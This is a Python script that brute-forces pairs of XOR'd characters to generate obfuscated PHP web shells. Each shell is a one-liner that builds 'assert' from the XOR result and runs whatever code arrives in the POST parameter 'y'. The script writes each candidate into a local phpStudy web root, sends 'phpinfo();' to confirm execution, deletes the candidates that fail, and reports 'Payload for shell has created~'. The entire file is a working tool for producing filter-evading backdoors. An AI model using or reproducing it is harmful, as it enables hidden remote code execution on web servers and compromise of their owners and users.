"""
#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""
import os,threading,requests
from threading import Thread
def Req_php(i1,i2,code):
    data = {
        'y': 'phpinfo();'
    }
    file_name = "E:/php/phpStudy_64/phpstudy_pro/WWW/fuzz/" + str(i1) + 'xor' + str(i2) + '.php'
    try:
        result = requests.post('http://127.0.0.1/fuzz/' + str(i1) + 'xor' + str(i2) + '.php', data).content.decode('utf-8')
        print("Check -> http://127.0.0.1/fuzz/" + str(i1) + 'xor' + str(i2) + '.php')
        if 'LAPTOP-AIJ2CGFT' in result:
            # with open('Bypass.txt', 'a+') as b:
            #     b.write(code + '\n')
            print('[+] Finded!')
        else:
            os.remove(file_name)
            print('[-] Failed.')
    except:
        if os.path.exists(file_name):
            os.remove(file_name)
            print('[-] Failed.')
        else:
            pass
def Store_Test(i1,i2,code):
    with open("E:/php/phpStudy_64/phpstudy_pro/WWW/fuzz/"+str(i1) + 'xor' + str(i2) + '.php', 'w') as f:
        f.write(code)
        f.close()
def main():
    S_l=[]
    R_l=[]
    for i1 in range(1,128):
        for i2 in range(1,128):
            code="<?php $s=('"+chr(i1)+"'"+'^'+"'"+ chr(i2) +"').'ssert';$s($_POST[y]); ?>"
    #         Store=Thread(target=Store_Test,args=(i1,i2,code))
    #         S_l.append(Store)
    #         Store.start()
    # for t in S_l:
    #     t.join()
    # print("[+] 哟噶哒 奈素~")
            # Req_php(i1, i2, code)
            req=Thread(target=Req_php,args=(i1,i2,code))
            R_l.append(req)
            req.start()
    for r in R_l:
        r.join()
    print('[+] Payload for shell has created~')


if __name__ == '__main__':
    main()